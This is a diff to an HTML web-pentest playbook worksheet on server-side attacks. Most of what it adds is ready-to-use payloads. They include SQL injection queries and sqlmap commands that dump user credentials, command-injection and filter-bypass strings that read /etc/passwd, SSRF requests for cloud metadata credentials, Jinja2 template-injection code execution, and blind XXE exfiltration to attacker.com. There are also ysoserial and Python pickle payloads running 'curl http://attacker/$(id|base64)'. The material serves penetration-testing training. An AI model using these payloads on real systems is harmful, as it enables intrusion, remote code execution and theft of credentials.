@@ -11,7 +11,7 @@
   <link rel="stylesheet" href="../vulns/style.css">
   <title>Day 4 Worksheet · Server-Side Deep Dive · Web Pentest Playbook</title>
 </head>
-<body data-day="day4" style="--day-color: var(--danger)">
+<body data-day="day4" data-day-num="4" style="--day-color: var(--danger)">
 
 <svg class="icon-sprite" aria-hidden="true" xmlns="http://www.w3.org/2000/svg">
   <defs>
@@ -44,7 +44,7 @@
 <div class="content-wrap" style="padding-top:2rem">
 
   <div class="day-page-hero">
-    <div class="day-num">Worksheet · Day 4 of 5</div>
+    <div class="day-num">Worksheet · Day 4 of 5 · <span data-day-date class="day-date-display unset">— pick start date below ↓</span></div>
     <h1>
       <span class="day-icon-pill"><svg class="icon" aria-hidden="true"><use href="#icon-server"/></svg></span>
       Server-Side Deep Dive
@@ -68,6 +68,44 @@
 
   <section class="worksheet-section" id="sqli">
     <h2><span class="ws-section-num">2</span>SQL Injection</h2>
+    <pre class="snippet"><span class="snippet-label">Manual confirmation queue (paste into Burp Repeater)</span><code># String context
+GET /search?q=test'                  HTTP/1.1
+GET /search?q=test'%20OR%20'1'='1    HTTP/1.1
+GET /search?q=test'+UNION+SELECT+NULL,NULL--   HTTP/1.1
+
+# Numeric context
+GET /product?id=1                     HTTP/1.1
+GET /product?id=1+OR+1=1              HTTP/1.1
+GET /product?id=1+AND+SLEEP(5)        HTTP/1.1
+
+# JSON body
+POST /api/search          {"q":"test'\""}
+POST /api/search          {"q":"test\\""}</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Schema enumeration (UNION-based, MySQL/Postgres)</span><code>-- Column count first:
+' ORDER BY 1-- '
+' ORDER BY 2-- '
+...
+
+-- Once column count is N, find string-cast columns:
+' UNION SELECT 'a',NULL,NULL-- '
+' UNION SELECT NULL,'a',NULL-- '
+...
+
+-- Tables in current DB:
+' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- '
+
+-- Columns in 'users':
+' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'-- '
+
+-- Dump:
+' UNION SELECT NULL,concat(username,':',password),NULL FROM users-- ' </code></pre>
+
+    <pre class="snippet"><span class="snippet-label">sqlmap (only after manual confirmation)</span><code># Save the request from Burp first (right-click → Copy to file)
+sqlmap -r req.txt --batch --risk=3 --level=5 --dbs --random-agent
+sqlmap -r req.txt --batch -D appdb --tables
+sqlmap -r req.txt --batch -D appdb -T users --dump --threads=4</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-sqli-confirm"><span class="task-label">Confirm injection: <code>' OR 1=1--</code> · <code>" OR 1=1--</code> · numeric <code>1 OR 1=1</code> · time-based <code>1; SELECT SLEEP(5)--</code></span></li>
       <li><input type="checkbox" data-key="check-sqli-context"><span class="task-label">Identify injection context: string vs numeric, single vs double quote, after WHERE/ORDER BY</span></li>
@@ -85,6 +123,25 @@
 
   <section class="worksheet-section" id="cmdi">
     <h2><span class="ws-section-num">3</span>OS Command Injection</h2>
+    <pre class="snippet"><span class="snippet-label">CMDi confirmation set</span><code># Time-based (works most of the time)
+;sleep 5;
+|sleep 5;
+&amp;amp;sleep 5&amp;amp;
+$(sleep 5)
+`sleep 5`
+%0Asleep%205%0A
+%0a/bin/sleep%205
+
+# OOB (Collaborator / oastify)
+;curl http://YOUR_OAST.collaborator;
+;nslookup unique.YOUR_OAST.collaborator;
+;ping -c 3 unique.YOUR_OAST.collaborator;
+
+# Filter bypasses
+{cat,/etc/passwd}                # comma trick
+$IFS$1cat$IFS/etc/passwd          # IFS for spaces
+'wh'oami                          # quote splitting</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-cmdi-confirm"><span class="task-label">Confirm: <code>; sleep 5</code>, <code>| sleep 5</code>, <code>&amp; ping -c 5 collab</code>, <code>$(sleep 5)</code>, backticks</span></li>
       <li><input type="checkbox" data-key="check-cmdi-context"><span class="task-label">Identify injection context: shell command-line, eval(), exec(), system()</span></li>
@@ -99,6 +156,29 @@
 
   <section class="worksheet-section" id="ssrf">
     <h2><span class="ws-section-num">4</span>SSRF</h2>
+    <pre class="snippet"><span class="snippet-label">Cloud metadata endpoints (try in order — often only one is reachable)</span><code># AWS — IMDSv1 (still common)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/&amp;lt;rolename&amp;gt;
+
+# AWS IMDSv2 (token-based — needs PUT first; SSRF that supports headers)
+PUT /latest/api/token  HTTP/1.1
+Host: 169.254.169.254
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/?recursive=true
+# (must include  Metadata-Flavor: Google  header)
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# (must include  Metadata: true  header)
+
+# Bypass IP filters
+http://127.1/                          # short form
+http://2130706433/                     # decimal
+http://0x7f.0.0.1/                     # hex
+http://[::ffff:127.0.0.1]/             # IPv6-mapped</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-ssrf-confirm"><span class="task-label">Confirm: point at Collaborator/oastify URL — DNS+HTTP hit?</span></li>
       <li><input type="checkbox" data-key="check-ssrf-localhost"><span class="task-label"><code>http://127.0.0.1</code>, <code>http://localhost</code>, <code>http://0.0.0.0</code>, <code>http://[::1]</code></span></li>
@@ -115,6 +195,21 @@
 
   <section class="worksheet-section" id="ssti">
     <h2><span class="ws-section-num">5</span>SSTI</h2>
+    <pre class="snippet"><span class="snippet-label">Engine-fingerprint payloads</span><code>{{7*7}}     → 49      = Jinja2 / Twig / Smarty / freemarker
+{{7*'7'}}   → 7777777 = Jinja2 (Python)
+            → 49      = Twig (PHP)
+${7*7}      → 49      = Spring SpEL / Thymeleaf
+&amp;lt;%= 7*7 %&amp;gt;  → 49      = ERB (Ruby/Rails)
+#{7*7}      → 49      = Pug / Slim
+@(7*7)      → 49      = Razor (.NET)</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Jinja2 RCE (after sandbox escape)</span><code>{{ &amp;apos;&amp;apos;.__class__.__mro__[1].__subclasses__() }}        # find subclass index
+{{ &amp;apos;&amp;apos;.__class__.__mro__[1].__subclasses__()[X]("id",shell=True,stdout=-1).communicate() }}
+
+# Newer style:
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code></pre>
+
     <ul class="task-list">
       <li><input type="checkbox" data-key="check-ssti-confirm"><span class="task-label">Confirm: <code>{{7*7}}</code>, <code>${7*7}</code>, <code>&lt;%= 7*7 %&gt;</code> — <code>49</code> in response?</span></li>
       <li><input type="checkbox" data-key="check-ssti-fingerprint"><span class="task-label">Engine fingerprint: Jinja2 <code>{{7*'7'}}</code>=7777777, Twig=49 string, Smarty=49</span></li>
@@ -127,6 +222,46 @@
   <section class="worksheet-section" id="xxe-deser">
     <h2><span class="ws-section-num">6</span>XXE / Deserialization / Race</h2>
     <p class="ws-intro">Often need only one of these — pick the highest-impact lead first.</p>
+    <pre class="snippet"><span class="snippet-label">Classic XXE</span><code>&amp;lt;?xml version="1.0"?&amp;gt;
+&amp;lt;!DOCTYPE root [
+  &amp;lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&amp;gt;
+]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;xxe;&amp;lt;/root&amp;gt;</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Blind XXE via external DTD</span><code>&amp;lt;!-- 1. Host this DTD on attacker.com/x.dtd --&amp;gt;
+&amp;lt;!ENTITY % file SYSTEM "file:///etc/passwd"&amp;gt;
+&amp;lt;!ENTITY % eval "&amp;lt;!ENTITY &amp;amp;#x25; exfil SYSTEM 'http://attacker/?d=%file;'&amp;gt;"&amp;gt;
+%eval;
+%exfil;
+
+&amp;lt;!-- 2. Submit this XML to the target --&amp;gt;
+&amp;lt;?xml version="1.0"?&amp;gt;
+&amp;lt;!DOCTYPE root [&amp;lt;!ENTITY % remote SYSTEM "http://attacker/x.dtd"&amp;gt; %remote;]&amp;gt;
+&amp;lt;root&amp;gt;&amp;lt;/root&amp;gt;</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Java deserialization (ysoserial)</span><code># 1. Detection — DNS callback only, no gadget chain needed
+java -jar ysoserial.jar URLDNS http://YOUR_OAST.collaborator | base64 -w0
+
+# 2. RCE (CommonsCollections5 — old Apache CC ≤ 3.2.1)
+java -jar ysoserial.jar CommonsCollections5 \
+  'curl http://attacker/$(id|base64)' | base64 -w0
+
+# Other useful payloads:
+java -jar ysoserial.jar Spring1 'whoami' | base64 -w0
+java -jar ysoserial.jar Hibernate1 ... | base64 -w0</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">Python pickle RCE</span><code>import pickle, os, base64
+class E:
+    def __reduce__(self):
+        return (os.system, ('curl http://attacker/$(id|base64)',))
+print(base64.b64encode(pickle.dumps(E())).decode())</code></pre>
+
+    <pre class="snippet"><span class="snippet-label">PHP deserialization (phpggc)</span><code>phpggc Laravel/RCE6 system 'id' -b
+phpggc -l   # list every framework + chain
+
+# Yii / Symfony / Slim / Magento all have phpggc chains.
+# Pipe straight into the request body if you can.</code></pre>
+
     <ul class="task-list">
       <li class="task-group-title">XXE</li>
       <li><input type="checkbox" data-key="check-xxe-classic"><span class="task-label">Classic: <code>&lt;!DOCTYPE x [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></span></li>
